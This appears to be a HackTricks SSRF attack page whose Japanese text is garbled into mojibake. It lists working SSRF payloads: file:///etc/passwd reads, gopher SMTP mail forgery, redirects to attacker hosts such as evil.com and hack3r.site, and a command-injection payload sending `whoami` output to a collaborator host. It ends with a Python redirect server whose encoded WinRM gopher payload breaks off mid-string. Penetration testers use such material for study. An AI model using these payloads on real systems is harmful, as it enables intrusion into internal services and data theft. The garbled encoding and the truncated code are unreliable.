# SSRFï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ã—ã€è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ã€ã¾ãŸã¯HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆSSRFï¼‰ã¯ã€æ”»æ’ƒè€…ãŒé¸æŠã—ãŸæ”»æ’ƒè€…ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«å¯¾ã—ã¦ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã‚ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã§ã™ï¼ˆ[ã“ã“ã‹ã‚‰](https://portswigger.net/web-security/ssrf)ï¼‰ã€‚

## SSRFã®ã‚­ãƒ£ãƒ—ãƒãƒ£

æœ€åˆã«è¡Œã†å¿…è¦ãŒã‚ã‚‹ã®ã¯ã€è‡ªåˆ†ãŒå¼•ãèµ·ã“ã—ãŸSSRFã®ç›¸äº’ä½œç”¨ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã“ã¨ã§ã™ã€‚HTTPã¾ãŸã¯DNSã®ç›¸äº’ä½œç”¨ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

* **Burpcollab**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)

## ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹

é€šå¸¸ã€SSRFã¯**ç‰¹å®šã®ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³**ã¾ãŸã¯URLã§ã®ã¿æ©Ÿèƒ½ã™ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ãã®ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®**ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’ä»‹ã—ãŸãƒã‚¤ãƒ‘ã‚¹

ã‚µãƒ¼ãƒãƒ¼ãŒæ­£ã—ãä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸å†…ã®**ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ã§ã€ã™ã¹ã¦ã®åˆ¶é™ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã¯**åŒã˜ãƒ‰ãƒ¡ã‚¤ãƒ³ã¸ã®SSRFã‚’è¨±å¯**ã—ã€ãŠãã‚‰ã**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’ãŸã©ã‚‹**ã§ã—ã‚‡ã†ã®ã§ã€**ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’æ‚ªç”¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ãŒå†…éƒ¨ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
è©³ç´°ã¯ã“ã¡ã‚‰ï¼š[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## ãƒ—ãƒ­ãƒˆã‚³ãƒ«

### file://
```
file:///etc/passwd
```
### dict://

DICT URLã‚¹ã‚­ãƒ¼ãƒ ã¯ã€DICTãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦åˆ©ç”¨å¯èƒ½ãªå®šç¾©ã‚„å˜èªãƒªã‚¹ãƒˆã‚’å‚ç…§ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```
### SFTP://

ã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ«ä¸Šã§ã®å®‰å…¨ãªãƒ•ã‚¡ã‚¤ãƒ«è»¢é€ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚
```
ssrf.php?url=sftp://evil.com:11111/
```
### TFTP://

Trivial File Transfer Protocolï¼ˆTFTPï¼‰ã¯ã€UDPä¸Šã§å‹•ä½œã—ã¾ã™ã€‚
```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```
### LDAP://

Lightweight Directory Access Protocolï¼ˆè»½é‡ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚¢ã‚¯ã‚»ã‚¹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼‰ã€‚IPãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã€åˆ†æ•£ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªæƒ…å ±ã‚µãƒ¼ãƒ“ã‚¹ã®ç®¡ç†ã¨ã‚¢ã‚¯ã‚»ã‚¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```
### Gopher://

ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**IPã€ãƒãƒ¼ãƒˆã€ãƒã‚¤ãƒˆ**ã‚’æŒ‡å®šã—ã¦ã‚µãƒ¼ãƒãƒ¼ã«**é€ä¿¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€åŸºæœ¬çš„ã«ã¯SSRFã‚’åˆ©ç”¨ã—ã¦**ä»»æ„ã®TCPã‚µãƒ¼ãƒãƒ¼ã¨é€šä¿¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŸã ã—ã€ã¾ãšã‚µãƒ¼ãƒ“ã‚¹ã¨ã®é€šä¿¡æ–¹æ³•ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
å¹¸ã„ãªã“ã¨ã«ã€[Gopherus](https://github.com/tarunkant/Gopherus)ã‚’ä½¿ç”¨ã—ã¦ã€è¤‡æ•°ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)ã‚’ä½¿ç”¨ã—ã¦ã€_Java RMI_ ã‚µãƒ¼ãƒ“ã‚¹å‘ã‘ã®_gopher_ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher HTTP is a technique used in server-side request forgery (SSRF) attacks. SSRF is a vulnerability that allows an attacker to make requests from the targeted server to other internal or external resources. Gopher HTTP takes advantage of the Gopher protocol, which is a simple protocol used for retrieving documents over the Internet.

In a Gopher HTTP attack, the attacker crafts a malicious request that tricks the server into making a request to a specified URL using the Gopher protocol. This can be used to bypass security measures that may be in place to prevent direct access to certain resources.

To perform a Gopher HTTP attack, the attacker typically needs to find a vulnerable parameter that accepts URLs and is susceptible to SSRF. The attacker then crafts a URL using the Gopher protocol and includes the desired target URL as a parameter. When the server processes the request, it will make a request to the specified URL using the Gopher protocol, potentially leaking sensitive information or performing unauthorized actions.

It is important for developers to be aware of the risks associated with SSRF vulnerabilities and implement proper input validation and sanitization to prevent these types of attacks. Additionally, server administrators should consider blocking or restricting access to the Gopher protocol if it is not necessary for their applications.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP â€” 1337ã«ãƒãƒƒã‚¯ã‚³ãƒã‚¯ãƒˆã™ã‚‹**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}

### SMTP

[https://twitter.com/har1sec/status/1182255952055164929](https://twitter.com/har1sec/status/1182255952055164929)ã‹ã‚‰ï¼š\
1\. SSRFã§localhostã®SMTPãƒãƒ¼ãƒˆï¼ˆ25ç•ªï¼‰ã«æ¥ç¶šã™ã‚‹\
2\. æœ€åˆã®è¡Œã‹ã‚‰å†…éƒ¨ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã™ã‚‹ 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail\
3\. [http://internaldomain.com](https://t.co/K0mHR0SPVH)ã‚’GitHubã§æ¤œç´¢ã—ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹\
4\. æ¥ç¶šã™ã‚‹

### Curl URL globbing - WAF bypass

ã‚‚ã—SSRFãŒ**curl**ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹å ´åˆã€curlã«ã¯[**URL globbing**](https://everything.curl.dev/cmdline/globbing)ã¨ã„ã†æ©Ÿèƒ½ãŒã‚ã‚Šã€WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ä¾‹ãˆã°ã€ã“ã®[**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)ã§ã¯ã€**`file`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä»‹ã—ãŸãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«**ã®ä¾‹ãŒã‚ã‚Šã¾ã™ã€‚
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
## SSRFãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã‚­ãƒ£ãƒ—ãƒãƒ£

* Burp Collaborator
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://app.interactsh.com/](https://app.interactsh.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)

## ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ã—ãŸSSRF

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€è¨ªå•è€…ã‚’è¿½è·¡ã™ã‚‹ãŸã‚ã®ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®åˆ†æã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯ã€ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«è¨˜éŒ²ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€å—ä¿¡ãƒªãƒ³ã‚¯ã®åˆ†æã«ç‰¹ã«èˆˆå‘³ãŒã‚ã‚‹ãŸã‚ã§ã™ã€‚é€šå¸¸ã€åˆ†æã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯ã€ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã«è¡¨ç¤ºã•ã‚Œã‚‹ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®URLã‚’å®Ÿéš›ã«è¨ªå•ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€å—ä¿¡ãƒªãƒ³ã‚¯ã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚¢ãƒ³ã‚«ãƒ¼ãƒ†ã‚­ã‚¹ãƒˆã‚’å«ã‚€å‚ç…§ã‚µã‚¤ãƒˆã®å†…å®¹ã‚’åˆ†æã™ã‚‹ãŸã‚ã«è¡Œã‚ã‚Œã¾ã™ã€‚ãã®çµæœã€ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã—ã°ã—ã°SSRFã®è„†å¼±æ€§ã®æ”»æ’ƒå¯¾è±¡ã¨ãªã‚Šã¾ã™ã€‚\
ã“ã®ã‚ˆã†ãªã€Œéš ã‚ŒãŸã€è„†å¼±æ€§ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«ã€Burpã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€Œ**Collaborator Everywhere**ã€ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## è¨¼æ˜æ›¸ã‹ã‚‰ã®SNIãƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ãŸSSRF

ä»»æ„ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®æœ€ã‚‚å˜ç´”ãªè¨­å®šãƒŸã‚¹ã¯ã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```nginx
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
ã“ã“ã§ã¯ã€SNIãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®å€¤ãŒãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦ç›´æ¥ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

ã“ã®å®‰å…¨ã§ãªã„è¨­å®šã§ã¯ã€**SSRFè„†å¼±æ€§ã‚’ç°¡å˜ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚SNIãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å¸Œæœ›ã™ã‚‹IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¾ãŸã¯ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’æŒ‡å®šã™ã‚‹ã ã‘ã§**ã€Nginxã‚’_internal.host.com_ã«æ¥ç¶šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```bash
openssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf
```
## [Wgetãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰](../file-upload/#wget-file-upload-ssrf-trick)

## ã‚³ãƒãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä¼´ã†SSRF

æ¬¡ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è©¦ã—ã¦ã¿ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°

ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ãŒæä¾›ã—ãŸæƒ…å ±ã§è‡ªå‹•çš„ã«PDFã‚’ä½œæˆã—ã¦ã„ã‚‹å ´åˆã€PDFä½œæˆæ™‚ã«ã‚µãƒ¼ãƒãƒ¼è‡ªä½“ã§å®Ÿè¡Œã•ã‚Œã‚‹JSã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€SSRFã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚[**ã“ã“ã§è©³ç´°æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRFã‹ã‚‰DoSã¸

è¤‡æ•°ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½œæˆã—ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‹ã‚‰SSRFã‚’æ‚ªç”¨ã—ã¦é‡ã„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ã€‚

## SSRF PHPé–¢æ•°

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## Gopherã¸ã®SSRFãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ

ä¸€éƒ¨ã®æ”»æ’ƒã§ã¯ã€**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’é€ä¿¡ã™ã‚‹**å¿…è¦ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼ˆãŠãã‚‰ãgopherã®ã‚ˆã†ãªç•°ãªã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ï¼‰ã€‚ä»¥ä¸‹ã«ã€ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’è¿”ã™ãŸã‚ã®ç•°ãªã‚‹Pythonã‚³ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã™:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%